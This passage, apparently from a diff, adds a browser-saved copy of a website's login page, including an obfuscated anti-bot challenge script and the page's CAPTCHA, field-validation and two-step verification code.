1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=((((($$$[(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=(((((((((((((((((((($$$[(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=((((((((((((((((((($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((((($$$[(!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=($$$[(!+[]+!+[])*1]+(!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[]+!+[]+!+[])*1]-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=(($$$[(!+[]+!+[]+!+[]+!+[])*1]+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[])*1]-(+!+[]+[+[]])*(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=(((($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((((((((((($$$[(!+[]+!+[]+!+[]+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)-(+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[])*1]=(((((((((((((((((((($$$[(!+[]+!+[]+!+[])*1]-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=(((((((((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]+(+!+[]+[+[]])*(+!+[])*1)+(+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=(((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(+!+[])*1)+(!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(+!+[])*1]=((((((($$$[(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)-(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)-(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=((((((($$$[(!+[]+!+[])*1]-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((((($$$[(!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1);$$$[(+!+[])*1]=(((($$$[(+!+[])*1]-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1);$$$[(+[])*(+!+[])*1]=(((((((((($$$[(+[])*(+!+[])*1]-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=((((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]=(((((((($$$[(!+[]+!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1);$$$[(+[])*(+!+[])*1]=(((((((((((((((($$$[(+[])*(+!+[])*1]+(+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[])*1)-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1);$$$[(+!+[])*1]=((((((((($$$[(+!+[])*1]-(+!+[]+[+[]])*(+!+[])*1)-(!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[])*1]=(((($$$[(!+[]+!+[])*1]+(!+[]+!+[])*1)+(!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1);$$$[(!+[]+!+[]+!+[]+!+[])*1]=((((((((($$$[(!+[]+!+[]+!+[]+!+[])*1]+(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[])*1)-(!+[]+!+[]+!+[]+!+[]+!+[])*1)+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])*1)+(+!+[]+[+[]])*(+!+[])*1);$$$$$$=$.modmd5(Math.min.apply(null, $$$)+"");</script></div>
+
+        <script src="./pa_files/enterprise.js.загрузка" async="" defer=""></script>
+        
+<script type="text/javascript">
+var widgetRecaptchaAuth;
+var widgetRecaptchaAuth2;
+
+function beforeAuthorize()
+{
+    var email = $('.auth_step1 input[name=email]').val();
+
+    var security_code = '';
+
+    var arSecurityCode = getSecurityCode();
+
+    if (arSecurityCode[email] == undefined)
+    {
+        $('.auth_step1 input[name=security_code]').val('');
+    }
+    else
+    {
+        security_code = arSecurityCode[email];
+        $('.auth_step1 input[name=security_code]').val(arSecurityCode[email]);
+    }
+    
+                var recaptchaV2 = '';
+
+            if (!$('#turnstile-auth').parent().hasClass('hide'))
+            {
+                try
+                {
+                    recaptchaV2 = turnstile.getResponse();
+                }
+                catch (e) {}
+            }
+            else
+            {
+                $('.auth_step1 input[name=g-recaptcha-response]').val('');
+            }
+
+            //pre(['turnstileResponse = ' + recaptchaV2]);
+            
+            if (!security_code.length && recaptchaV2 != undefined && !recaptchaV2.length)
+        {
+            try
+            {
+                if ($('.grecaptcha-badge').length)
+                {
+                    $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', true);
+
+                    grecaptcha.enterprise.ready(function()
+                    {
+                        grecaptcha.enterprise.execute('6LdBMlYbAAAAAI4GL2slroFt9JLP32VguWiTQP9N').then(function(token)
+                        {
+                                                        $('.auth_step1 input[name=recaptcha_v3]').val(token);
+
+                            ajaxFormSubmit('.auth_form', 'afterAuthorize');
+
+                            setTimeout(function()
+                            {
+                                $('.auth_step1 input[name=recaptcha_v3]').val('');
+                                $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', false);
+                            }, 500);
+                        });
+                    });
+                }
+                else
+                {
+                    $('.auth_step1 #g-recaptcha-auth').parent().removeClass('hide');
+                }
+            }
+            catch (e)
+            {
+                $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', false);
+                $('.auth_step1 #g-recaptcha-auth').parent().removeClass('hide');
+                //ajaxFormSubmit('.auth_form', 'afterAuthorize');
+            }
+        }
+        else
+        {
+            ajaxFormSubmit('.auth_form', 'afterAuthorize');
+        }
+        }
+
+
+        var turnstileOnloadCallback = function()
+        {
+            widgetRecaptchaAuth = turnstile.render('#turnstile-auth',
+            {
+                'sitekey': '0x4AAAAAAADSGfZQH6o7UqM0',
+                'response-field-name': 'g-recaptcha-response',
+                'size': 'normal',
+                'error-callback': function()
+                {
+                    console.log('Network error');
+                }
+            });
+
+                    };
+        
+
+var FPvalid = {email: '', password: ''};
+
+function ButtonOn()
+{
+    $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', !(
+        $('.auth_step1 input[name=email]').val().length > 4 && $('.auth_step1 input[name=password]').val().length > 4
+    ));
+}
+
+$(document).ready(function()
+{
+    if ($('.auth_step1 input[name=email]').val().length)
+    {
+        $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', false);
+    }
+
+    setTimeout(function()
+    {
+        $('.auth_step1 input[name=email], .auth_step1 input[name=password]').change();
+    }, 100);
+
+    setTimeout(function()
+    {
+                if (
+            ($('.auth_step1 input[name=email]').val().length > 4 || $('.auth_step1 input[name=email]').css('background-color') == 'rgb(232, 240, 254)')
+            &&
+            ($('.auth_step1 input[name=password]').val().length > 4  || $('.auth_step1 input[name=password]').css('background-color') == 'rgb(232, 240, 254)')
+        )
+        {
+            $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', false);
+        }
+        else
+        {
+            $('.auth_step1 button.login-form__login-btn.step1').prop('disabled', true);
+            $('.auth_step1 input[name=email]').focus();
+        }
+    }, 1000);
+
+
+    $('.auth_step1 input[name=email], .auth_step1 input[name=password]').on('input change', function(e)
+	{
+        var name = $(this).attr('name');
+		var val = $(this).val();
+        
+        if(e.type == 'input')
+        {
+            if (val.length > 4 && FPvalid[name] != '')
+            {
+                $(this).parent().addClass('is-valid');
+            }
+            else
+            {
+                $(this).parent().removeClass('is-valid');
+            }
+        }
+
+        FPvalid[name] = val;
+
+        checkError(this);
+		ButtonOn();
+    });
+
+
+    $('.auth_step2 input[name=code]').on('input change', function(e)
+    {
+        var val = $(this).val().replace(/[^0-9]+/g, '');
+        $(this).val(val);
+
+        var inputCnt = $('.auth_step2 .verification_code_input input:visible').length;
+
+        if (val.length >= inputCnt)
+        {
+            $(this).parent().addClass('is-valid');
+            $('.auth_step2 button.step2').prop('disabled', false);
+        }
+        else
+        {
+            $(this).parent().removeClass('is-valid');
+            $('.auth_step2 button.step2').prop('disabled', true);
+        }
+        checkError(this);
+    });
+});
+
+
+function getSecurityCode()
+{
+    var arSecurityCode = localStorage.getItem('security_code');
+
+    if (arSecurityCode == null)
+    {
+        arSecurityCode = {};
+    }
+    else
+    {
+        try
+        {
+            arSecurityCode = JSON.parse(arSecurityCode);
+        }
+        catch (e)
+        {
+            arSecurityCode = {};
+        }
+    }
+
+    return arSecurityCode;
+}
+
+
+function saveSecurityCode(security_code)
+{
+    var account = $('.auth_step1 input[name=email]').val();
+    var arSecurityCode = getSecurityCode();
+
+    arSecurityCode[account] = security_code;
+
+    localStorage.setItem('security_code', JSON.stringify(arSecurityCode));
+}
+
+
+function afterAuthorize(e, data)
+{
+    //pre(data);
+
+    if (data['security_code'] != undefined && data['security_code'].length)
+    {
+        saveSecurityCode(data.security_code)
+    }
+
+    if (data.location.length)
+    {
+        document.location = data.location;
+    }
+    else
+    {
+        $('.auth_step1').hide();
+        $('.auth_step2').show();
+
+        $('.auth_step2 .form-input-top span').html(data['confirm_type_desc']['top']);
+        $('.auth_step2 .verification_desc1').html(data['confirm_type_desc']['desc1']);
+        $('.auth_step2 .verification_desc2').html(data['confirm_type_desc']['desc2']);
+
+        if (data['confirm_type_desc']['resend'].length)
+        {
+            $('.auth_step2 .verification_code_resend a').html(data['confirm_type_desc']['resend']);
+            $('.auth_step2 .verification_code_resend').show();
+        }
+        else
+        {
+            $('.auth_step2 .verification_code_resend').hide();
+        }
+
+        $('.auth_step2 input[name=code]').val('');
+        $('.auth_step2 .verification_code_input input').val('');
+
+        $('.auth_step2 .verification_code_input input').hide();
+        $('.auth_step2 .verification_code_input input').slice(0, data['code_length']).show();
+
+        $('.auth_step2 .verification_code_input input:first').focus().change();
+
+        switch (data['code_type'])
+        {
+            case 'call':
+                $('.auth_step2 .verification_code_div b').html(data['confirm_type_desc']['caller']).show();
+            break;
+
+            default:
+                $('.auth_step2 .verification_code_div b').html('').hide();
+        }
+
+        
+        $('.auth_step2 span.error').html('');
+        $('.auth_step2 input.error, .auth_step2 textarea.error').removeClass('error');
+        $('.auth_step2 div.error').addClass('hide').html('');
+        $('.auth_step2 div.result').addClass('hide').html('');
+    }
+}
+
+
+function afterAuthorizationConfirm(e, data)
+{
+    switch (data.action)
+    {
+        case 'back':
+            $('.auth_step2').hide();
+            $('.auth_step1').show();
+            $('.auth_step1 input[name=email]').focus();
+            
+                                try
+                    {
+                        //turnstile.reset(widgetRecaptchaAuth);
+                        turnstile.remove();
+                        turnstileOnloadCallback();
+                    }
+                    catch (e) {}
+                    
+            //$('.auth_step1 #g-recaptcha-auth').parent().addClass('hide');
+        break;
+
+        default:
+            document.location = data.location;
+    }
+}
+
+
+function afterAuthorizationConfirmRepeat(e, data)
+{
+    switch (data.action)
+    {
+        case 'back':
+            $('.auth_step2').hide();
+            $('.auth_step1').show();
+            $('.auth_step1 input[name=email]').focus();
+            
+                                try
+                    {
+                        //turnstile.reset(widgetRecaptchaAuth);
+                        turnstile.remove();
+                        turnstileOnloadCallback();
+                    }
+                    catch (e) {}
+                    
+            //$('.auth_step1 #g-recaptcha-auth').parent().addClass('hide');
+        break;
+
+        default:
+            $('.auth_step2 .verification_code_resend').hide();
+
+            $('.auth_step2 .form-input-top span').html(data['confirm_type_desc']['top']);
+            $('.auth_step2 .verification_desc1').html(data['confirm_type_desc']['desc1']);
+            $('.auth_step2 .verification_desc2').html(data['confirm_type_desc']['desc2']);
+
+            $('.auth_step2 input[name=code]').val('');
+            $('.auth_step2 .verification_code_input input').val('');
+            $('.auth_step2 .verification_code_input input:first').focus();
+
+            switch (data['code_type'])
+            {
+                case 'call':
+                    $('.auth_step2 .verification_code_div b').html(data['confirm_type_desc']['caller']).show();
+                break;
+
+                default:
+                    $('.auth_step2 .verification_code_div b').html('').hide();
+            }
+
+            if (['sms', 'call'].indexOf(data['code_type']) == -1)
+            {
+                htmlErrorHandler('.auth_step2 div.topform-result', data['result']);
+            }
+    }
+}
+</script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-fv4bt7nvz752" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./pa_files/anchor.html"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./pa_files/saved_resource.html"></iframe></div><g-ext-in></g-ext-in></body></html>
